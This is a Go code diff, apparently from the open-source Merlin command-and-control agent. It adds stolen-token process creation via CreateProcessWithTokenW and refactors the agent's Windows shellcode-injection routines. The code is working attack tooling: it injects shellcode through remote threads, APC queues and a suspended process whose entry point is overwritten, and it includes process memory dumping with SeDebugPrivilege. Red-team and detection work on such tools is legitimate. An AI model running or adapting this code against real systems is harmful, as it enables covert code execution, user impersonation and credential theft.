@@ -33,6 +33,11 @@ import (
 
 	// Sub Repositories
 	"golang.org/x/sys/windows"
+
+	// Internal
+	"github.com/Ne0nd0g/merlin-agent/os/windows/api/advapi32"
+	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/pipes"
+	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/tokens"
 )
 
 const (
@@ -72,6 +77,11 @@ const (
 
 // executeCommand is function used to instruct an agent to execute a command on the host operating system
 func executeCommand(name string, args []string) (stdout string, stderr string) {
+	// If agent has another user's access token, switch to Windows API call
+	if windowsToken != 0 {
+		return tokens.CreateProcessWithToken(windowsToken, name, args)
+	}
+
 	cmd := exec.Command(name, args...)
 
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Only difference between this and agent.go
@@ -137,6 +147,13 @@ func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
 	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
 	CloseHandle := kernel32.NewProc("CloseHandle")
 
+	// Setup OS environment, if any
+	err := Setup()
+	if err != nil {
+		return err
+	}
+	defer TearDown()
+
 	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
 
 	if errOpenProcess != nil {
@@ -188,6 +205,13 @@ func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
 	CloseHandle := kernel32.NewProc("CloseHandle")
 	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
 	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
+
+	// Setup OS environment, if any
+	err := Setup()
+	if err != nil {
+		return err
+	}
+	defer TearDown()
 
 	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
 
@@ -265,6 +289,13 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 	Thread32First := kernel32.NewProc("Thread32First")
 	Thread32Next := kernel32.NewProc("Thread32Next")
 	OpenThread := kernel32.NewProc("OpenThread")
+
+	// Setup OS environment, if any
+	err := Setup()
+	if err != nil {
+		return err
+	}
+	defer TearDown()
 
 	// Consider using NtQuerySystemInformation to replace CreateToolhelp32Snapshot AND to find a thread in a wait state
 	// https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori
@@ -375,7 +406,7 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	}
 
 	// Verify SpawnTo executable exists
-	if _, err := os.Stat(spawnto); os.IsNotExist(err) {
+	if _, err = os.Stat(spawnto); os.IsNotExist(err) {
 		return stdout, stderr, fmt.Errorf("path does not exist: %s\r\n%s", spawnto, err)
 	}
 
@@ -387,63 +418,89 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
 	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
 
-	// Create anonymous pipe for STDIN
-	// TODO I don't think I need this for anything
-	var stdInRead windows.Handle
-	var stdInWrite windows.Handle
-
-	errStdInPipe := windows.CreatePipe(&stdInRead, &stdInWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
-	if errStdInPipe != nil {
-		return stdout, stderr, fmt.Errorf("error creating the STDIN pipe:\r\n%s", errStdInPipe)
+	// Setup pipes to retrieve output
+	stdInRead, _, stdOutRead, stdOutWrite, stdErrRead, stdErrWrite, err := pipes.CreateAnonymousPipes()
+	if err != nil {
+		return
 	}
 
-	// Create anonymous pipe for STDOUT
-	var stdOutRead windows.Handle
-	var stdOutWrite windows.Handle
-	errStdOutPipe := windows.CreatePipe(&stdOutRead, &stdOutWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
-	if errStdOutPipe != nil {
-		return stdout, stderr, fmt.Errorf("error creating the STDOUT pipe:\r\n%s", errStdOutPipe)
+	// Convert the program to a LPCWSTR
+	lpApplicationName, err := syscall.UTF16PtrFromString(spawnto)
+	if err != nil {
+		err = fmt.Errorf("there was an error converting the application name \"%s\" to LPCWSTR: %s", spawnto, err)
+		return
 	}
 
-	// Create anonymous pipe for STDERR
-	var stdErrRead windows.Handle
-	var stdErrWrite windows.Handle
-	errStdErrPipe := windows.CreatePipe(&stdErrRead, &stdErrWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
-	if errStdErrPipe != nil {
-		return stdout, stderr, fmt.Errorf("error creating the STDERR pipe:\r\n%s", errStdErrPipe)
+	// Convert the program to a LPCWSTR
+	lpCommandLine, err := syscall.UTF16PtrFromString(args)
+	if err != nil {
+		stderr = fmt.Sprintf("there was an error converting the application arguments \"%s\" to LPCWSTR: %s", args, err)
+		return
 	}
 
-	// Create child process in suspended state
-	/*
-		BOOL CreateProcessW(
-		LPCWSTR               lpApplicationName,
-		LPWSTR                lpCommandLine,
-		LPSECURITY_ATTRIBUTES lpProcessAttributes,
-		LPSECURITY_ATTRIBUTES lpThreadAttributes,
-		BOOL                  bInheritHandles,
-		DWORD                 dwCreationFlags,
-		LPVOID                lpEnvironment,
-		LPCWSTR               lpCurrentDirectory,
-		LPSTARTUPINFOW        lpStartupInfo,
-		LPPROCESS_INFORMATION lpProcessInformation
-		);
-	*/
+	var lpEnvironment uintptr
+	var lpCurrentDirectory uintptr
 
-	procInfo := &windows.ProcessInformation{}
-	startupInfo := &windows.StartupInfo{
+	lpProcessInformation := &windows.ProcessInformation{}
+	lpStartupInfo := &windows.StartupInfo{
 		StdInput:   stdInRead,
 		StdOutput:  stdOutWrite,
 		StdErr:     stdErrWrite,
-		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
-		ShowWindow: 1,
+		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED | windows.STARTF_USESHOWWINDOW,
+		ShowWindow: windows.SW_HIDE,
 	}
-	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(spawnto), syscall.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
-	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
-		return stdout, stderr, fmt.Errorf("error calling CreateProcess:\r\n%s", errCreateProcess)
+
+	if windowsToken != 0 {
+		LOGON_NETCREDENTIALS_ONLY := uint32(0x2) // Could not find this constant in the windows package
+		dwLogonFlags := LOGON_NETCREDENTIALS_ONLY
+		// BOOL CreateProcessWithTokenW(
+		//  [in]                HANDLE                hToken,
+		//  [in]                DWORD                 dwLogonFlags,
+		//  [in, optional]      LPCWSTR               lpApplicationName,
+		//  [in, out, optional] LPWSTR                lpCommandLine,
+		//  [in]                DWORD                 dwCreationFlags,
+		//  [in, optional]      LPVOID                lpEnvironment,
+		//  [in, optional]      LPCWSTR               lpCurrentDirectory,
+		//  [in]                LPSTARTUPINFOW        lpStartupInfo,
+		//  [out]               LPPROCESS_INFORMATION lpProcessInformation
+		//);
+		err = advapi32.CreateProcessWithTokenW(
+			uintptr(windowsToken),
+			uintptr(dwLogonFlags),
+			uintptr(unsafe.Pointer(lpApplicationName)),
+			uintptr(unsafe.Pointer(lpCommandLine)),
+			uintptr(windows.CREATE_SUSPENDED),
+			lpEnvironment,
+			lpCurrentDirectory,
+			uintptr(unsafe.Pointer(lpStartupInfo)),
+			uintptr(unsafe.Pointer(lpProcessInformation)),
+		)
+		if err != nil {
+			return
+		}
+	} else {
+		/*
+			BOOL CreateProcessW(
+			LPCWSTR               lpApplicationName,
+			LPWSTR                lpCommandLine,
+			LPSECURITY_ATTRIBUTES lpProcessAttributes,
+			LPSECURITY_ATTRIBUTES lpThreadAttributes,
+			BOOL                  bInheritHandles,
+			DWORD                 dwCreationFlags,
+			LPVOID                lpEnvironment,
+			LPCWSTR               lpCurrentDirectory,
+			LPSTARTUPINFOW        lpStartupInfo,
+			LPPROCESS_INFORMATION lpProcessInformation
+			);
+		*/
+		errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(spawnto), syscall.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
+		if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
+			return stdout, stderr, fmt.Errorf("error calling CreateProcess:\r\n%s", errCreateProcess)
+		}
 	}
 
 	// Allocate memory in child process
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(lpProcessInformation.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling VirtualAlloc:\r\n%s", errVirtualAlloc)
@@ -454,7 +511,7 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	}
 
 	// Write shellcode into child process memory
-	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(lpProcessInformation.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
 	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory)
@@ -462,14 +519,14 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 
 	// Change memory permissions to RX in child process where shellcode was written
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(lpProcessInformation.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx)
 	}
 
 	var processInformation PROCESS_BASIC_INFORMATION
 	var returnLength uintptr
-	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
+	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(lpProcessInformation.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
 	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling NtQueryInformationProcess:\r\n\t%s", errNtQueryInformationProcess)
 	}
@@ -498,7 +555,7 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	var peb PEB
 	var readBytes int32
 
-	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
+	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
 	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory)
 	}
@@ -506,7 +563,7 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	var dosHeader IMAGE_DOS_HEADER
 	var readBytes2 int32
 
-	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
+	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
 	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory2)
 	}
@@ -521,7 +578,7 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	var Signature uint32
 	var readBytes3 int32
 
-	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
+	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
 	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory3)
 	}
@@ -535,7 +592,7 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	var peHeader IMAGE_FILE_HEADER
 	var readBytes4 int32
 
-	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
+	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
 	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory4)
 	}
@@ -546,9 +603,9 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	var readBytes5 int32
 
 	if peHeader.Machine == 34404 { // 0x8664
-		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
+		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
 	} else if peHeader.Machine == 332 { // 0x14c
-		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
+		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
 	} else {
 		return stdout, stderr, fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
 	}
@@ -590,97 +647,51 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	epBuffer = append(epBuffer, byte(0xff))
 	epBuffer = append(epBuffer, byte(0xe0))
 
-	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
+	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(lpProcessInformation.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
 
 	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
 		return stdout, stderr, fmt.Errorf("error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory2)
 	}
 
 	// Resume the child process
-	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
+	_, errResumeThread := windows.ResumeThread(lpProcessInformation.Thread)
 	if errResumeThread != nil {
 		return stdout, stderr, fmt.Errorf("[!]Error calling ResumeThread:\r\n%s", errResumeThread)
 	}
 
 	// Close the handle to the child process
-	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
+	errCloseProcHandle := windows.CloseHandle(lpProcessInformation.Process)
 	if errCloseProcHandle != nil {
 		return stdout, stderr, fmt.Errorf("error closing the child process handle:\r\n\t%s", errCloseProcHandle)
 	}
 
 	// Close the hand to the child process thread
-	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
+	errCloseThreadHandle := windows.CloseHandle(lpProcessInformation.Thread)
 	if errCloseThreadHandle != nil {
 		return stdout, stderr, fmt.Errorf("error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle)
 	}
 
-	// Close the write handle the anonymous STDOUT pipe
-	errCloseStdOutWrite := windows.CloseHandle(stdOutWrite)
-	if errCloseStdOutWrite != nil {
-		return stdout, stderr, fmt.Errorf("error closing STDOUT pipe write handle:\r\n\t%s", errCloseStdOutWrite)
+	// Close the "write" pipe handles
+	err = pipes.ClosePipes(0, 0, 0, stdOutWrite, 0, stdErrWrite)
+	if err != nil {
+		stderr = err.Error()
+		return
 	}
 
-	// Close the read handle to the anonymous STDIN pipe
-	errCloseStdInRead := windows.CloseHandle(stdInRead)
-	if errCloseStdInRead != nil {
-		return stdout, stderr, fmt.Errorf("error closing the STDIN pipe read handle:\r\n\t%s", errCloseStdInRead)
+	// Read from the pipes
+	_, out, stderr, err := pipes.ReadPipes(0, stdOutRead, stdErrRead)
+	if err != nil {
+		stderr += err.Error()
 	}
+	stdout += out
 
-	// Close the write handle to the anonymous STDERR pipe
-	errCloseStdErrWrite := windows.CloseHandle(stdErrWrite)
-	if errCloseStdErrWrite != nil {
-		return stdout, stderr, fmt.Errorf("[!]err closing STDERR pipe write handle:\r\n\t%s", errCloseStdErrWrite)
+	// Close the "read" pipe handles
+	err = pipes.ClosePipes(stdInRead, 0, stdOutRead, 0, stdErrRead, 0)
+	if err != nil {
+		stderr += err.Error()
+		return
 	}
-
-	// Read STDOUT from child process
-	/*
-		BOOL ReadFile(
-		HANDLE       hFile,
-		LPVOID       lpBuffer,
-		DWORD        nNumberOfBytesToRead,
-		LPDWORD      lpNumberOfBytesRead,
-		LPOVERLAPPED lpOverlapped
-		);
-	*/
-	nNumberOfBytesToRead := make([]byte, 1)
-	var stdOutBuffer []byte
-	var stdOutDone uint32
-	var stdOutOverlapped windows.Overlapped
-
-	// ReadFile on STDOUT pipe
-	for {
-		errReadFileStdOut := windows.ReadFile(stdOutRead, nNumberOfBytesToRead, &stdOutDone, &stdOutOverlapped)
-		if errReadFileStdOut != nil && errReadFileStdOut.Error() != "The pipe has been ended." {
-			return stdout, stderr, fmt.Errorf("error reading from STDOUT pipe:\r\n\t%s", errReadFileStdOut)
-		}
-		if int(stdOutDone) == 0 {
-			break
-		}
-		for _, b := range nNumberOfBytesToRead {
-			stdOutBuffer = append(stdOutBuffer, b)
-		}
-	}
-
-	// Read STDERR from child process
-	var stdErrBuffer []byte
-	var stdErrDone uint32
-	var stdErrOverlapped windows.Overlapped
-
-	for {
-		errReadFileStdErr := windows.ReadFile(stdErrRead, nNumberOfBytesToRead, &stdErrDone, &stdErrOverlapped)
-		if errReadFileStdErr != nil && errReadFileStdErr.Error() != "The pipe has been ended." {
-			return stdout, stderr, fmt.Errorf("error reading from STDOUT pipe:\r\n\t%s", errReadFileStdErr)
-		}
-		if int(stdErrDone) == 0 {
-			break
-		}
-		for _, b := range nNumberOfBytesToRead {
-			stdErrBuffer = append(stdErrBuffer, b)
-		}
-	}
-
-	// Write the data collected from the child process' STDOUT to the parent process' STDOUT
-	return string(stdOutBuffer), string(stdErrBuffer), err
+	return
 }
 
 // TODO always close handle during exception handling
@@ -711,6 +722,13 @@ func miniDump(tempDir string, process string, inPid uint32) (map[string]interfac
 	if err != nil {
 		return mini, err
 	}
+
+	// Setup OS environment, if any
+	err = Setup()
+	if err != nil {
+		return mini, err
+	}
+	defer TearDown()
 
 	// Get debug privs (required for dumping processes not owned by current user)
 	err = sePrivEnable("SeDebugPrivilege")
